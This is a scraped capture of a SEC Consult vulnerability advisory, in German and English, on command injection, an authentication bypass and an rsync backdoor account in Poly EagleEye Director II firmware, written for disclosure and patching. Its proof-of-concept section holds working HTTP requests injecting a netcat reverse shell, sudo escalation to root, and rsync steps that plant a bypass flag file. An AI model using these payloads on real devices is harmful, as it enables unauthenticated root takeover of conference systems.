=== Content from www.poly.com_80215b18_20250108_124004.html ===




=== Content from sec-consult.com_9d675ad0_20250108_124004.html ===

Toggle Navbar

* [Karriere](/de/karriere/)
* [Unternehmen](/de/unternehmen/)
* [Kontakt](/de/kontakt/)

* DE
  + [EN](/vulnerability-lab/advisory/critical-vulnerabilities-poly-eagleeye-director-ii/ "English")
Suche

* Sicherheitsüberprüfungen
  + [Sicherheit von Webanwendungen](/de/sicherheitsueberpruefungen/web-application-security/)
  + [Pentest vom zertifizierten Anbieter](/de/sicherheitsueberpruefungen/penetrationstests/)
  + [Mobile Security](/de/sicherheitsueberpruefungen/mobile-security/)
  + [Cloud Security](/de/sicherheitsueberpruefungen/cloud-security/)
  + [IT Infrastruktur Sicherheit](/de/sicherheitsueberpruefungen/it-infrastruktur-sicherheit/)
  + [Sicherheit für SAP(R) Services](/de/sicherheitsueberpruefungen/sicherheit-fuer-sap-services/)
  + [Sicherheit für IoT und Embedded Systems](/de/sicherheitsueberpruefungen/sicherheit-fuer-iot-und-embedded-systems/)
  + [Red Teaming − Cyberangriffssimulation](/de/sicherheitsueberpruefungen/red-teaming/)
* Prozesse & Organisation
  + [Informationssicherheitsmanagement (ISM)](/de/prozesse-organisation/informationssicherheitsmanagement-ism/)
  + [Sicherheit von Netz- und Informationssystemen (NIS)](/de/prozesse-organisation/sicherheit-von-netz-und-informationssystemen-nis/)
  + [OT Security](/de/prozesse-organisation/ot-security/)
  + [Consulting für Sichere Software-Entwicklung](/de/prozesse-organisation/consulting-fuer-sichere-software-entwicklung/)
  + [Red Teaming - Cyberangriffssimulation](/de/sicherheitsueberpruefungen/red-teaming/)
  + [SEC Trainings](/de/prozesse-organisation/sec-trainings/)
  + [Projekt- und Programmmanagement](/de/prozesse-organisation/projekt-und-programmmanagement/)
* Incident Response
  + [SEC Defence](/de/incident-response/sec-defence/)
* [Vulnerability Lab](/de/vulnerability-lab/)
* [Blog](/de/blog/)
 [Incident?
Angegriffen?
Incident melden](/de/incident-response/sec-defence/)

1. [Home](/de/)
2. [Vulnerability Lab](/de/vulnerability-lab/)
3. Mehrere kritische Schwachstellen in Poly EagleEye Director II
# Mehrere kritische Schwachstellen in Poly EagleEye Director II

Title

Multiple Critical Vulnerabilities

Product

Poly EagleEye Director II

Vulnerable Version

2.2.1.1 (Jul 1, 2021)

Fixed Version

2.2.2.1 or higher

CVE Number

CVE-2022-26479, CVE-2022-26482

Impact

critical

Homepage

[https://www.poly.com](https://www.poly.com "https://www.poly.com")

Found

14.07.2021

By

Johannes Kruchem (Office Vienna) | SEC Consult Vulnerability Lab

Der Eagle Eye Director II von Poly ist verwundbar gegen mehrere Authenticated OS Command Injection Schwachstellen. In Kombination mit einem undokumentierten Authentication Bypass, einem rsync Backdoor Account und sudo Rechten war es möglich, Befehle ohne Authentifizierung mit höchsten Rechten auszuführen.

Zum vollständigen [Security Advisory](https://sec-consult.com/vulnerability-lab/advisory/critical-vulnerabilities-poly-eagleeye-director-ii) (Englisch).

EOF Johannes Kruchem / @2022

*Interesse an einer Zusammenarbeit mit den Experten von SEC Consult? Senden Sie uns Ihre****[Bewerbung](https://sec-consult.com/de/karriere/)****.
 Möchten Sie Ihre eigene Cyber-Sicherheit mit den Experten von SEC Consult verbessern? Kontaktieren Sie unsere **[lokalen Büros](https://sec-consult.com/de/kontakt/)**.*

[Zurück](/de/vulnerability-lab/)

* [Impressum](/de/impressum/)
* [Datenschutzerklärung](/de/datenschutz/)
* [Jobs](/de/karriere/)

SEC Consult ist einer der führenden Berater im Bereich Cyber- und [Applikationssicherheit](/de/sicherheitsueberpruefungen/web-application-security/ "Sicherheit von Webanwendungen"). Das Unternehmen ist Spezialist für die Einführung von [Informationssicherheits-Management](/de/prozesse-organisation/informationssicherheitsmanagement-ism/ "Informationssicherheits-Management"), [NIS Sicherheitsaudits](/de/prozesse-organisation/sicherheit-von-netz-und-informationssystemen-nis/ "NIS Sicherheitsaudits"), [Penetrationstests](/de/sicherheitsueberpruefungen/penetrationstests/ "Pentesting"), Zertifizierungsbegleitung für ISO 27001, [Cyber Defence](/de/incident-response/sec-defence/ "Cyber Defence") und [sichere Software](/de/prozesse-organisation/consulting-fuer-sichere-software-entwicklung/ "Software Sicherheit"). SEC Consult ist Teil von [Eviden](https://eviden.com/ "Link zur Eviden-Website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/de/unternehmen/ "Über uns")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/de/unternehmen/ "Über uns")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/de/unternehmen/ "Über uns")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/de/unternehmen/ "Über uns")

## Wir nutzen Cookies

Wir verwenden Cookies, um Ihnen ein perfektes Besuchserlebnis zu bieten. Dazu zählen Cookies, die für den Betrieb der Seite und für die Steuerung unserer kommerziellen Unternehmensziele notwendig sind, sowie solche, die lediglich zu anonymen Statistikzwecken, für Komforteinstellungen oder zur Anzeige personalisierter Inhalte genutzt werden. Entscheiden Sie selbst, welche Kategorien Sie zulassen möchten. Bitte beachten Sie, dass auf Basis Ihrer Einstellungen womöglich nicht mehr alle Funktionalitäten der Seite zur Verfügung stehen.

**[Impressum](/de/impressum/)** •  **[Datenschutzerklärung](/de/datenschutz/)**

### Technisch erforderlich

(
0
Service
)

nein

Technisch erforderlich (
0
Service
)

ja

### Analyse / Statistik

(
1
Service
)

Anonyme Auswertung zur Fehlerbehebung und Weiterentwicklung

nein

Analyse / Statistik (
1
Service
)

ja

#### Matomo

nein

Matomo

ja

Matomo.org
Details anzeigen

Details schliessen

**Zweck:** Fehleranalyse, statistische Auswertung unserer Webseitenzugriffe, Kampagnenanalyse, Conversiontracking
 **Verarbeitungsvorgänge:** Erhebung von Zugriffsdaten, Daten ihres Browsers und Daten über die aufgerufenen Inhalte; Ausführung von Analysesoftware und Speicherung von Daten auf ihrem Endgerät, Anonymisierung der erhobenen Daten; Auswertung der anonymen Daten in Form von Statistiken
 **Speicherdauer:** 6 Monate.
 **Gemeinsamer Verantwortlicher:** LimeSoda Interactive Marketing GmbH
 **Rechtsgrundlage für die Datenverarbeitung:** Art. 6 Abs. 1 lit. f der DSGVO
 **Folgen der Nichteinwilligung:** Dieses Basis-Tracking ist für den Betrieb unserer Website unbedingt erforderlich.
 **Datenübermittlung:** Die mit Matomo erhobenen Daten werden werden auf unseren eigenen Servern gespeichert. Eine Weitergabe an Dritte erfolgt nicht.

Auswahl bestätigen

Alle ablehnen

Alle akzeptieren



=== Content from sec-consult.com_b9aade57_20250108_124004.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/poly-eagleeye-director-ii-kritische-schwachstellen/ "German")
Search

* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [Network and Information Systems Security (NIS)](/processes-organisation/network-and-information-systems-security-nis/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Multiple Critical Vulnerabilities in Poly EagleEye Director II
# Multiple Critical Vulnerabilities in Poly EagleEye Director II

Title

Multiple Critical Vulnerabilities

Product

Poly EagleEye Director II

Vulnerable Version

2.2.1.1 (Jul 1, 2021)

Fixed Version

2.2.2.1 or higher

CVE Number

CVE-2022-26479, CVE-2022-26482

Impact

critical

Homepage

[https://www.poly.com](https://www.poly.com "https://www.poly.com")

Found

14.07.2021

By

Johannes Kruchem (Office Vienna) | SEC Consult Vulnerability Lab

Poly's Eagle Eye Director II is vulnerable to multiple authenticated OS command injection vulnerabilities. In combination with an undocumented authentication bypass vulnerability, an rsync backdoor account and sudo privileges, it was possible to execute commands with the highest privileges without authentication.

## Vendor description

*"Why settle for a one-size-fits-all view of your conference room? EagleEye Director II takes video conferencing and conference room web cameras to the next level—with people-tracking technology and automatic zoom. You’ll find that when people aren’t worrying about staying in camera view or how to work a remote control, they stay focused on the bigger issue—solving critical business problems."*

Source: <https://www.poly.com/us/en/products/video-conferencing/studio/studio-x50>

## Business recommendation

The vendor provides a patch which should be installed immediately.

## Vulnerability overview/description

### 1) Multiple Authenticated Command Injection Vulnerabilities (CVE-2022-26482)

When logged on to the administration web interface, command injection payloads can be inserted in at least four different fields. This happens because the user input is not escaped and gets concatenated with a string which is executed afterwards with "os.system()". The webserver was started as "www-data" who has sudo privileges.

### 2) Authentication Bypass (CVE-2022-26479)

The authentication can be bypassed by creating a specific file on the file system. If this file is created, every API call is executed as admin with no further authentication (sessionid). This behavior could not be found in any documentation. The creation of this file was possible with rsync for which a backdoor account was found. The rsync daemon runs on port 873 and provides the modules "/flag" and "/update".

The combination of 1) and 2) leads to an privileged unauthenticated OS command injection.

## Proof of concept

### 1) Multiple Authenticated Command Injection Vulnerabilities (CVE-2022-26482)

When logged into the web interface, the name of the device can be changed in the settings. A command can be injected with $(<command>) in the name. To bypass the length-limit the payload can be changed in the POST request, which looks as follows:

```
POST /api/deviceName HTTP/1.1
Host: 10.0.0.3
Cookie: sessionid=ovizy1tgavf9ipd2ha1g6zu379oopqcn; language=StringResource.de-DE
Connection: close

{"deviceName":"EEDII-Master $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.5 8888>/tmp/f)"}
```

It looks as follows on the host system, where an nc listener was started:

```
$ nc -lvp 8888
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.3]
$ whoami
www-data
```

Sudo allowed executing commands as root:

```
$ sudo whoami
root
```

Also the following request results in command execution. This request was not intercepted but reconstructed from the source code of the application.

```
POST /api/region HTTP/1.1
Host: 10.0.0.3
Cookie: sessionid=ovizy1tgavf9ipd2ha1g6zu379oopqcn; language=StringResource.de-DE
Content-Length: 45

{"region":"$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.5 9999 >/tmp/f)"}
```

When enabling 802.1X, one can see that the payload "sudo sh" works as well. In this case an attacker is root immediately:

```
POST /api/region HTTP/1.1
Host: 10.0.0.3
Cookie: sessionid=ovizy1tgavf9ipd2ha1g6zu379oopqcn; language=StringResource.de-DE
Content-Length: 45

{"region":"$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.5 9999 >/tmp/f)"}
```

When generating a certificate, the following payload can be injected to execute a reverse shell:

```
POST /api/certificate HTTP/1.1
Host: 10.0.0.3
Cookie: language=StringResource.de-DE; sessionid=vxxs25a2mcn5xz4ndjao9noogpqc7yy2

Connection: close

{"name":"EagleEyeDirectorII.polycom.com\n","country":"US","province":"California","city":"San Jose","organization":"Polycom Inc. \":\"$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sudo sh -i 2>&1|nc 10.0.0.5 7777 >/tmp/f)","organizationUnit":"Video Division"}
```
### 2) Authentication Bypass (CVE-2022-26479)

#### Step 1 - Find the rsync backdoor account

The rsync modules "/flag" and "/update" are configured to require authentication. In the rsync config file "/etc/rsyncd.conf" the file "/etc/rsyncd.scrt" was set as secrets file which contains the following "user:password" in plain text. This user was not found in any documentation:

```
visage:<PoC removed>
```
#### Step 2 - Find the authentication bypass

The source code in "/www/DjangoTest/TestApp/api2.py" contains the following code snippet:

```
def checkCookie(request):
  <snipped>
  filename = "/data/local/tmp/runAutomationFlag"
  if (os.path.exists(filename)):
    logger.info("run automation, do not check cookie")
    return "success"
  else:
    <snipped>
```

If the file "runAutomationFlag" exists in "/data/local/tmp", the cookie is not going to be checked anymore. Coincidentally, the rsync module "/flag" is configured for the path "/data/local" so a "/tmp" needs to be attached. To exploit this authentication bypass the runAutomationFlag file can be copied to the remote path as follows:

```
$ touch runAutomationFlag
$ rsync -av ./runAutomationFlag rsync://visage@10.0.0.3:873/flag/tmp
Password
sending incremental file list
runAutomationFlag
```

Now the file is in the specific location:

```
$ pwd
/data/local/tmp
$ ls
rebootcnt.txt
runAutomationFlag
```

The payloads from 1) can now be sent unauthenticated since the cookies are not checked anymore. This behavior is not documented.

## Vulnerable / tested versions

Version 2.2.1.1 (Jul 1, 2021) was found to be vulnerable.

## Vendor contact timeline

| 2021-07-14 | Contacting vendor through PSIRT email. |
| --- | --- |
| 2021-07-15 | Vendor sent PGP key. |
| 2021-07-16 | Advisory was sent to the vendor. |
| 2021-07 to 2022-03 | Further coordination with multiple emails and meetings. |
| 2022-03-18 | Vendor provides draft advisory. |
| 2022-03 - 2022-06 | Patch already available, waiting for vendor advisory release. |
| 2022-06-01 | Coordinated release of security advisory. |

## Solution

Update to firmware version 2.2.2.1 or higher.

The firmware can be downloaded from the vendor's support page:

<https://www.poly.com/us/en/support/products>

This issue has been documented in the vendor's security advisory PLYPL21-12:
<https://www.poly.com/content/dam/www/products/support/global/security/2022/PLYPL21-12_EEDII-Multiple-Security-Vulnerabilities.pdf>

### Workaround

None

### Advisory URL:

<https://sec-consult.com/vulnerability-lab/>

EOF Johannes Kruchem / @2022

*Interested to work with the experts of SEC Consult?*

*Send us your [application](https://sec-consult.com/career/)*

*Interested in improving your cyber security with the experts of SEC Consult?*

*Contact our [local offices](https://sec-consult.com/contact/)*

[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), [NIS security audits](/processes-organisation/network-and-information-systems-security-nis/ "NIS security audits"), [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all


